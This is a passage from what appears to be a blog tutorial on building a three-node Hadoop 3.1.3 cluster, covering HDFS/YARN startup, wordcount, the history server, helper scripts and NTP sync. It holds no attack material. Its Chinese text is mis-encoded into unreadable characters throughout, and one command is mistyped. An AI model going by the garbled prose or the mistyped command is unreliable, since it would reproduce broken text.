incremental file list</span><br><span class="line"></span><br><span class="line">sent 1,014 bytes  received 19 bytes  688.67 bytes/sec</span><br><span class="line">total size is 107,680  speedup is 104.24</span><br><span class="line">==================== hadoop103 ====================</span><br><span class="line">sending incremental file list</span><br><span class="line">etc/hadoop/</span><br><span class="line">etc/hadoop/workers</span><br><span class="line"></span><br><span class="line">sent 1,094 bytes  received 51 bytes  2,290.00 bytes/sec</span><br><span class="line">total size is 107,680  speedup is 94.04</span><br><span class="line">==================== hadoop104 ====================</span><br><span class="line">sending incremental file list</span><br><span class="line">etc/hadoop/</span><br><span class="line">etc/hadoop/workers</span><br><span class="line"></span><br><span class="line">sent 1,094 bytes  received 51 bytes  2,290.00 bytes/sec</span><br><span class="line">total size is 107,680  speedup is 94.04</span><br></pre></td></tr></table></figure>

<h4 id="å¯åŠ¨é›†ç¾¤"><a href="#å¯åŠ¨é›†ç¾¤" class="headerlink" title="å¯åŠ¨é›†ç¾¤"></a>å¯åŠ¨é›†ç¾¤</h4><p>1.å¦‚æœé›†ç¾¤æ˜¯ç¬¬ä¸€æ¬¡å¯åŠ¨ï¼Œéœ€è¦åœ¨hadoop102èŠ‚ç‚¹æ ¼å¼åŒ–NameNode(æ³¨æ„:æ ¼å¼åŒ– NameNodeï¼Œä¼šäº§ç”Ÿæ–°çš„é›†ç¾¤ idï¼Œå¯¼è‡´ NameNode å’Œ DataNode çš„é›†ç¾¤ id ä¸ä¸€è‡´ï¼Œé›†ç¾¤æ‰¾ä¸åˆ°å·²å¾€æ•°æ®ã€‚å¦‚æœé›†ç¾¤åœ¨è¿è¡Œè¿‡ç¨‹ä¸­æŠ¥é”™ï¼Œéœ€è¦é‡æ–°æ ¼å¼åŒ– NameNode çš„è¯ï¼Œ<strong>ä¸€å®šè¦å…ˆåœ æ­¢ NameNode å’Œ DataNode è¿›ç¨‹ï¼Œå¹¶ä¸”è¦åˆ é™¤æ‰€æœ‰æœºå™¨çš„ data å’Œ logs ç›®å½•ï¼Œç„¶åå†è¿›è¡Œæ ¼å¼åŒ–</strong>ã€‚)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hdfs namenode -format</span><br></pre></td></tr></table></figure>

<p>2.å¯åŠ¨HDFS</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ sbin/start-dfs.sh</span><br></pre></td></tr></table></figure>

<p>3.åœ¨é…ç½®äº†ResourceManageçš„èŠ‚ç‚¹ï¼ˆhadoop103ï¼‰å¯åŠ¨yarn</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ssh hadoop103</span><br><span class="line">Last login: Mon Jun 28 02:29:59 2021 from hadoop102</span><br><span class="line">[huang@hadoop103 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop103 hadoop-3.1.3]$ sbin/start-yarn.sh </span><br></pre></td></tr></table></figure>

<p>4.Web ç«¯æŸ¥çœ‹ HDFS çš„ NameNode</p>
<ul>
<li><p>æµè§ˆå™¨ä¸­è¾“å…¥:<a href="http://hadoop102:9870/">http://hadoop102:9870</a></p>
</li>
<li><p>æŸ¥çœ‹ HDFS ä¸Šå­˜å‚¨çš„æ•°æ®ä¿¡æ¯</p>
</li>
</ul>
<p>5.Web ç«¯æŸ¥çœ‹ YARN çš„ ResourceManager</p>
<ul>
<li><p>æµè§ˆå™¨ä¸­è¾“å…¥:<a href="http://hadoop103:8088/">http://hadoop103:8088</a></p>
</li>
<li><p>æŸ¥çœ‹ YARN ä¸Šè¿è¡Œçš„ Job ä¿¡æ¯</p>
</li>
</ul>
<h4 id="é›†ç¾¤æµ‹è¯•"><a href="#é›†ç¾¤æµ‹è¯•" class="headerlink" title="é›†ç¾¤æµ‹è¯•"></a>é›†ç¾¤æµ‹è¯•</h4><h5 id="ä¸Šä¼ æ–‡ä»¶åˆ°é›†ç¾¤"><a href="#ä¸Šä¼ æ–‡ä»¶åˆ°é›†ç¾¤" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶åˆ°é›†ç¾¤"></a>ä¸Šä¼ æ–‡ä»¶åˆ°é›†ç¾¤</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">å°æ–‡ä»¶</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd wcinput/</span><br><span class="line">[huang@hadoop102 wcinput]$ vi word.txt</span><br><span class="line">[huang@hadoop102 wcinput]$ hadoop fs -mkdir /input</span><br><span class="line">[huang@hadoop102 wcinput]$ hadoop fs -put /opt/module/hadoop-3.1.3/wcinput/word.txt /input</span><br><span class="line">2021-06-28 12:15:59,028 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¤§æ–‡ä»¶</span></span><br><span class="line">[huang@hadoop102 wcinput]$ hadoop fs -put /opt/software/jdk-8u212-linux-x64.tar.gz /</span><br><span class="line">2021-06-28 12:16:44,297 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">2021-06-28 12:16:46,064 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br></pre></td></tr></table></figure>

<h5 id="ä¸Šä¼ æ–‡ä»¶åæŸ¥çœ‹æ–‡ä»¶å­˜æ”¾åœ¨ä»€ä¹ˆä½ç½®"><a href="#ä¸Šä¼ æ–‡ä»¶åæŸ¥çœ‹æ–‡ä»¶å­˜æ”¾åœ¨ä»€ä¹ˆä½ç½®" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶åæŸ¥çœ‹æ–‡ä»¶å­˜æ”¾åœ¨ä»€ä¹ˆä½ç½®"></a>ä¸Šä¼ æ–‡ä»¶åæŸ¥çœ‹æ–‡ä»¶å­˜æ”¾åœ¨ä»€ä¹ˆä½ç½®</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 wcinput]$ cd /opt/module/hadoop-3.1.3/data/dfs/data/current/BP-1650407707-10.211.55.4-1624852380753/current/finalized/subdir0/subdir0/</span><br><span class="line">[huang@hadoop102 subdir0]$ ll</span><br><span class="line">æ€»ç”¨é‡ 191944</span><br><span class="line">-rw-rw-r--. 1 huang huang        64 6æœˆ  28 12:15 blk_1073741825</span><br><span class="line">-rw-rw-r--. 1 huang huang        11 6æœˆ  28 12:15 blk_1073741825_1001.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang 134217728 6æœˆ  28 12:16 blk_1073741826</span><br><span class="line">-rw-rw-r--. 1 huang huang   1048583 6æœˆ  28 12:16 blk_1073741826_1002.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang  60795424 6æœˆ  28 12:16 blk_1073741827</span><br><span class="line">-rw-rw-r--. 1 huang huang    474975 6æœˆ  28 12:16 blk_1073741827_1003.meta</span><br><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741825</span><br><span class="line">hello hadoop</span><br><span class="line">hadoop huangmingwang</span><br><span class="line">huang ming wang</span><br><span class="line">hadoop hello</span><br></pre></td></tr></table></figure>

<h5 id="æ‹¼æ¥æ–‡ä»¶"><a href="#æ‹¼æ¥æ–‡ä»¶" class="headerlink" title="æ‹¼æ¥æ–‡ä»¶"></a>æ‹¼æ¥æ–‡ä»¶</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741826 &gt;&gt; tmp.tar.gz</span><br><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741827 &gt;&gt; tmp.tar.gz</span><br><span class="line">[huang@hadoop102 subdir0]$ tar -zxvf tmp.tar.gz </span><br><span class="line"></span><br><span class="line">[huang@hadoop102 subdir0]$ ll</span><br><span class="line">æ€»ç”¨é‡ 382392</span><br><span class="line">-rw-rw-r--. 1 huang huang        64 6æœˆ  28 12:15 blk_1073741825</span><br><span class="line">-rw-rw-r--. 1 huang huang        11 6æœˆ  28 12:15 blk_1073741825_1001.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang 134217728 6æœˆ  28 12:16 blk_1073741826</span><br><span class="line">-rw-rw-r--. 1 huang huang   1048583 6æœˆ  28 12:16 blk_1073741826_1002.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang  60795424 6æœˆ  28 12:16 blk_1073741827</span><br><span class="line">-rw-rw-r--. 1 huang huang    474975 6æœˆ  28 12:16 blk_1073741827_1003.meta</span><br><span class="line">drwxr-xr-x. 7 huang huang      4096 4æœˆ   2 2019 jdk1.8.0_212</span><br><span class="line">-rw-rw-r--. 1 huang huang 195013152 6æœˆ  28 12:23 tmp.tar.gz</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line">[huang@hadoop102 software]$ rm -rf jdk-8u212-linux-x64.tar.gz </span><br><span class="line">[huang@hadoop102 software]$ ll</span><br><span class="line">æ€»ç”¨é‡ 330156</span><br><span class="line">-rw-rw-r--. 1 huang huang 338075860 6æœˆ  28 00:11 hadoop-3.1.3.tar.gz</span><br><span class="line">[huang@hadoop102 software]$ hadoop fs -get /jdk-8u212-linux-x64.tar.gz ./</span><br><span class="line">2021-06-28 12:28:24,662 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 software]$ ll</span><br><span class="line">æ€»ç”¨é‡ 520600</span><br><span class="line">-rw-rw-r--. 1 huang huang 338075860 6æœˆ  28 00:11 hadoop-3.1.3.tar.gz</span><br><span class="line">-rw-r--r--. 1 huang huang 195013152 6æœˆ  28 12:28 jdk-8u212-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>

<h5 id="æ‰§è¡Œwordcountç¨‹åº"><a href="#æ‰§è¡Œwordcountç¨‹åº" class="headerlink" title="æ‰§è¡Œwordcountç¨‹åº"></a>æ‰§è¡Œwordcountç¨‹åº</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount /input /output</span><br></pre></td></tr></table></figure>

<h3 id="é…ç½®å†å²æœåŠ¡å™¨"><a href="#é…ç½®å†å²æœåŠ¡å™¨" class="headerlink" title="é…ç½®å†å²æœåŠ¡å™¨"></a>é…ç½®å†å²æœåŠ¡å™¨</h3><p>1.é…ç½® mapred-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd /opt/module/hadoop-3.1.3/etc/hadoop/</span><br><span class="line">[huang@hadoop102 hadoop]$ vi mapred-site.xml</span><br></pre></td></tr></table></figure>

<p>åœ¨è¯¥æ–‡ä»¶ä¸­å¢åŠ å¦‚ä¸‹é…ç½®ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- å†å²æœåŠ¡å™¨ç«¯åœ°å€ --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:10020<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- å†å²æœåŠ¡å™¨ web ç«¯åœ°å€ --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.webapp.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:19888<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.åˆ†å‘é…ç½®</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ xsync /opt/module/hadoop-3.1.3/etc/</span><br></pre></td></tr></table></figure>

<p>3.åœ¨ hadoop102 å¯åŠ¨å†å²æœåŠ¡å™¨</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ mapred --daemon start historyserve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">æŸ¥çœ‹æ˜¯å¦å¯åŠ¨</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ jps</span><br><span class="line">29072 JobHistoryServer</span><br><span class="line">29146 Jps</span><br><span class="line">16923 DataNode</span><br><span class="line">16748 NameNode</span><br><span class="line">17454 NodeManager</span><br></pre></td></tr></table></figure>

<h3 id="é…ç½®æ—¥å¿—çš„èšé›†"><a href="#é…ç½®æ—¥å¿—çš„èšé›†" class="headerlink" title="é…ç½®æ—¥å¿—çš„èšé›†"></a>é…ç½®æ—¥å¿—çš„èšé›†</h3><h3 id="é›†ç¾¤å¯åŠ¨å’Œåœæ­¢æ–¹å¼"><a href="#é›†ç¾¤å¯åŠ¨å’Œåœæ­¢æ–¹å¼" class="headerlink" title="é›†ç¾¤å¯åŠ¨å’Œåœæ­¢æ–¹å¼"></a>é›†ç¾¤å¯åŠ¨å’Œåœæ­¢æ–¹å¼</h3><h4 id="å„ä¸ªæ¨¡å—åˆ†å¼€å¯åŠ¨-x2F-åœæ­¢ï¼ˆé…ç½®sshæ˜¯å‰æï¼‰å¸¸ç”¨"><a href="#å„ä¸ªæ¨¡å—åˆ†å¼€å¯åŠ¨-x2F-åœæ­¢ï¼ˆé…ç½®sshæ˜¯å‰æï¼‰å¸¸ç”¨" class="headerlink" title="å„ä¸ªæ¨¡å—åˆ†å¼€å¯åŠ¨&#x2F;åœæ­¢ï¼ˆé…ç½®sshæ˜¯å‰æï¼‰å¸¸ç”¨"></a>å„ä¸ªæ¨¡å—åˆ†å¼€å¯åŠ¨&#x2F;åœæ­¢ï¼ˆé…ç½®sshæ˜¯å‰æï¼‰å¸¸ç”¨</h4><p>1.æ•´ä½“å¯åŠ¨&#x2F;åœæ­¢HDFS</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start-dfs.sh/stop-dfs.sh</span><br></pre></td></tr></table></figure>

<p>2.æ•´ä½“å¯åŠ¨&#x2F;åœæ­¢YARN</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start-yarn.sh/stop-yarn.sh</span><br></pre></td></tr></table></figure>

<h4 id="å„ä¸ªæœåŠ¡é€ä¸€å¯åŠ¨-x2F-åœæ­¢"><a href="#å„ä¸ªæœåŠ¡é€ä¸€å¯åŠ¨-x2F-åœæ­¢" class="headerlink" title="å„ä¸ªæœåŠ¡é€ä¸€å¯åŠ¨&#x2F;åœæ­¢"></a>å„ä¸ªæœåŠ¡é€ä¸€å¯åŠ¨&#x2F;åœæ­¢</h4><p>1.åˆ†åˆ«å¯åŠ¨&#x2F;åœæ­¢HDFSç»„ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hdfs --daemon start/stop namenode/datanode/secondarynamenode</span><br></pre></td></tr></table></figure>

<p>2.å¯åŠ¨&#x2F;åœæ­¢YARN</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yarn --daemon start/stop resourcemanager/nodemanager</span><br></pre></td></tr></table></figure>

<h3 id="ç¼–å†™Hadoopé›†ç¾¤å¸¸ç”¨è„šæœ¬"><a href="#ç¼–å†™Hadoopé›†ç¾¤å¸¸ç”¨è„šæœ¬" class="headerlink" title="ç¼–å†™Hadoopé›†ç¾¤å¸¸ç”¨è„šæœ¬"></a>ç¼–å†™Hadoopé›†ç¾¤å¸¸ç”¨è„šæœ¬</h3><h4 id="Hadoop-é›†ç¾¤å¯åœè„šæœ¬-åŒ…å«-HDFSï¼ŒYarnï¼ŒHistoryserver-myhadoop-sh"><a href="#Hadoop-é›†ç¾¤å¯åœè„šæœ¬-åŒ…å«-HDFSï¼ŒYarnï¼ŒHistoryserver-myhadoop-sh" class="headerlink" title="Hadoop é›†ç¾¤å¯åœè„šæœ¬(åŒ…å« HDFSï¼ŒYarnï¼ŒHistoryserver):myhadoop.sh"></a>Hadoop é›†ç¾¤å¯åœè„šæœ¬(åŒ…å« HDFSï¼ŒYarnï¼ŒHistoryserver):myhadoop.sh</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd /home/huang/bin/</span><br><span class="line">[huang@hadoop102 bin]$ vi myhadoop.sh</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">if [ $# -lt 1 ]</span><br><span class="line">then</span><br><span class="line">		echo &quot;No Args Input...&quot;</span><br><span class="line">		exit ; </span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">case $1 in </span><br><span class="line">&quot;start&quot;)</span><br><span class="line">	echo &quot; =================== å¯åŠ¨ hadoop é›†ç¾¤ ===================&quot;</span><br><span class="line">	echo &quot; --------------- å¯åŠ¨ hdfs ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/sbin/start-dfs.sh&quot; </span><br><span class="line">	echo &quot; --------------- å¯åŠ¨ yarn ---------------&quot;</span><br><span class="line">	ssh hadoop103 &quot;/opt/module/hadoop-3.1.3/sbin/start-yarn.sh&quot;</span><br><span class="line">	echo &quot; --------------- å¯åŠ¨ historyserver ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/bin/mapred --daemon start historyserver&quot;</span><br><span class="line">;;</span><br><span class="line">&quot;stop&quot;)</span><br><span class="line">	echo &quot; =================== å…³é—­ hadoop é›†ç¾¤ ===================&quot;</span><br><span class="line">	echo &quot; --------------- å…³é—­ historyserver ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/bin/mapred --daemon stop historyserver&quot;</span><br><span class="line">	echo &quot; --------------- å…³é—­ yarn ---------------&quot;</span><br><span class="line">	ssh hadoop103 &quot;/opt/module/hadoop-3.1.3/sbin/stop-yarn.sh&quot; </span><br><span class="line">	echo &quot; --------------- å…³é—­ hdfs ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/sbin/stop-dfs.sh&quot;</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">   echo &quot;Input Args Error...&quot;</span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">èµ‹äºˆè„šæœ¬æ‰§è¡Œæƒé™</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x myhadoop.sh </span><br><span class="line"><span class="meta">#</span><span class="language-bash">åˆ†å‘è„šæœ¬</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /home/huang/bin/</span><br></pre></td></tr></table></figure>

<h4 id="æŸ¥çœ‹ä¸‰å°æœåŠ¡å™¨Javaè¿›ç¨‹è„šæœ¬ï¼šjpsall"><a href="#æŸ¥çœ‹ä¸‰å°æœåŠ¡å™¨Javaè¿›ç¨‹è„šæœ¬ï¼šjpsall" class="headerlink" title="æŸ¥çœ‹ä¸‰å°æœåŠ¡å™¨Javaè¿›ç¨‹è„šæœ¬ï¼šjpsall"></a>æŸ¥çœ‹ä¸‰å°æœåŠ¡å™¨Javaè¿›ç¨‹è„šæœ¬ï¼šjpsall</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /home/huang/bin/</span><br><span class="line">[huang@hadoop102 bin]$ vi jpsall</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for host in hadoop102 hadoop103 hadoop104 </span><br><span class="line">do</span><br><span class="line">	echo =============== $host ===============</span><br><span class="line">  ssh $host jps</span><br><span class="line">done</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">èµ‹äºˆæ‰§è¡Œæƒé™</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x jpsall</span><br><span class="line"><span class="meta">#</span><span class="language-bash">åˆ†å‘è„šæœ¬</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /home/huang/bin/</span><br></pre></td></tr></table></figure>

<h3 id="å¸¸ç”¨ç«¯å£å·"><a href="#å¸¸ç”¨ç«¯å£å·" class="headerlink" title="å¸¸ç”¨ç«¯å£å·"></a>å¸¸ç”¨ç«¯å£å·</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220049227.png" alt="image-20210628130455175"></p>
<h3 id="é›†ç¾¤å†…æ—¶é—´åŒæ­¥"><a href="#é›†ç¾¤å†…æ—¶é—´åŒæ­¥" class="headerlink" title="é›†ç¾¤å†…æ—¶é—´åŒæ­¥"></a>é›†ç¾¤å†…æ—¶é—´åŒæ­¥</h3><p>å¦‚æœæœåŠ¡å™¨åœ¨å…¬ç½‘ç¯å¢ƒ(èƒ½è¿æ¥å¤–ç½‘)ï¼Œå¯ä»¥ä¸é‡‡ç”¨é›†ç¾¤æ—¶é—´åŒæ­¥ï¼Œå› ä¸ºæœåŠ¡å™¨ä¼šå®šæœŸ å’Œå…¬ç½‘æ—¶é—´è¿›è¡Œæ ¡å‡†;</p>
<p>å¦‚æœæœåŠ¡å™¨åœ¨å†…ç½‘ç¯å¢ƒï¼Œå¿…é¡»è¦é…ç½®é›†ç¾¤æ—¶é—´åŒæ­¥ï¼Œå¦åˆ™æ—¶é—´ä¹…äº†ï¼Œä¼šäº§ç”Ÿæ—¶é—´åå·®ï¼Œ å¯¼è‡´é›†ç¾¤æ‰§è¡Œä»»åŠ¡æ—¶é—´ä¸åŒæ­¥ã€‚</p>
<h4 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h4><p>æ‰¾ä¸€ä¸ªæœºå™¨ï¼Œä½œä¸ºæ—¶é—´æœåŠ¡å™¨ï¼Œæ‰€æœ‰çš„æœºå™¨ä¸è¿™å°é›†ç¾¤æ—¶é—´è¿›è¡Œå®šæ—¶çš„åŒæ­¥ï¼Œç”Ÿäº§ç¯å¢ƒ æ ¹æ®ä»»åŠ¡å¯¹æ—¶é—´çš„å‡†ç¡®ç¨‹åº¦è¦æ±‚å‘¨æœŸåŒæ­¥ã€‚æµ‹è¯•ç¯å¢ƒä¸ºäº†å°½å¿«çœ‹åˆ°æ•ˆæœï¼Œé‡‡ç”¨ 1 åˆ†é’ŸåŒæ­¥ä¸€ æ¬¡ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220053356.png" alt="æˆªå±2021-06-28 ä¸‹åˆ1.07.20"></p>
<h4 id="æ—¶é—´æœåŠ¡å™¨é…ç½®ï¼ˆå¿…é¡»rootç”¨æˆ·ï¼‰"><a href="#æ—¶é—´æœåŠ¡å™¨é…ç½®ï¼ˆå¿…é¡»rootç”¨æˆ·ï¼‰" class="headerlink" title="æ—¶é—´æœåŠ¡å™¨é…ç½®ï¼ˆå¿…é¡»rootç”¨æˆ·ï¼‰"></a>æ—¶é—´æœåŠ¡å™¨é…ç½®ï¼ˆå¿…é¡»rootç”¨æˆ·ï¼‰</h4><p>1.æŸ¥çœ‹æ‰€æœ‰èŠ‚ç‚¹ ntpd æœåŠ¡çŠ¶æ€å’Œå¼€æœºè‡ªå¯åŠ¨çŠ¶æ€</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ sudo systemctl status ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl start ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl is-enabled ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl status ntpd</span><br></pre></td></tr></table></figure>

<p>2.ä¿®æ”¹hadoop102çš„ntp.confé…ç½®æ–‡ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/ntp.conf </span><br><span class="line"><span class="meta"># </span><span class="language-bash">Hosts on <span class="built_in">local</span> network are less restricted.</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">restrict 192.168.1.0 mask 255.255.255.0 nomodify notrap</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æˆæƒ 10.211.55.0-10.211.55.255 ç½‘æ®µä¸Šçš„æ‰€æœ‰æœºå™¨å¯ä»¥ä»è¿™å°æœºå™¨ä¸ŠæŸ¥è¯¢å’ŒåŒæ­¥æ—¶é—´</span></span><br><span class="line">restrict 10.211.55.0 mask 255.255.255.0 nomodify notrap</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Use public servers from the pool.ntp.org project.</span> </span><br><span class="line"><span class="meta"># </span><span class="language-bash">Please consider joining the pool (http://www.pool.ntp.org/join.html).</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é›†ç¾¤åœ¨å±€åŸŸç½‘ä¸­ä¸ä½¿ç”¨å…¶ä»–äº’è”ç½‘ä¸Šçš„æ—¶é—´ï¼Œä¸‹é¢4ä¸ªéƒ½æ³¨é‡Šæ‰</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server 127.127.1.0 #127.127.1.0 ä¸æ˜¯IP åœ°å€ã€‚ å®ƒæ˜¯ä¸€ç§æ ¼å¼ï¼Œç”¨æ¥å¼•ç”¨å‘æœåŠ¡å™¨æä¾›å‡†ç¡®æ—¶é—´çš„æ—¶é’Ÿã€‚</span><br><span class="line">fudge 127.127.1.0 stratum 10</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/sysconfig/ntpd</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¢åŠ å†…å®¹å¦‚ä¸‹ï¼ˆè®©ç¡¬ä»¶æ—¶é—´ä¸ç³»ç»Ÿæ—¶é—´ä¸€èµ·åŒæ­¥ï¼‰</span></span><br><span class="line">SYNC_HWCLOCK=yes</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯åŠ¨ntpd</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl start ntpd</span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®¾ç½®å¼€æœºè‡ªå¯</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl enable ntpd</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/ntpd.service to /usr/lib/systemd/system/ntpd.service.</span><br></pre></td></tr></table></figure>

<p>3.å…¶ä»–æœºå™¨é…ç½®ï¼ˆå¿…é¡»rootç”¨æˆ·ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop103 ~]$ sudo systemctl stop ntpd</span><br><span class="line">[huang@hadoop103 ~]$ sudo systemctl disable ntpd</span><br><span class="line"></span><br><span class="line">[huang@hadoop104 ~]$ sudo systemctl stop ntpd</span><br><span class="line">[huang@hadoop104 ~]$ sudo systemctl disable ntpd</span><br><span class="line"></span><br><span class="line">[huang@hadoop104 ~]$ sudo crontab -e</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç¼–å†™å†…å®¹å¦‚ä¸‹</span></span><br><span class="line">*/1 * * * * /usr/sbin/ntpdate hadoop102</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[huang@hadoop103 ~]$ sudo crontab -e</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç¼–å†™å†…å®¹å¦‚ä¸‹</span></span><br><span class="line">*/1 * * * * /usr/sbin/ntpdate hadoop102</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä»»æ„ä¿®æ”¹æœºå™¨æ—¶é—´</span></span><br><span class="line">[huang@hadoop103 ~]$ sudo date -s &quot;2021-9-9 11:11:11&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä¸€åˆ†é’ŸåæŸ¥çœ‹</span></span><br><span class="line">[huang@hadoop103 ~]$ sudo date</span><br></pre></td></tr></table></figure>

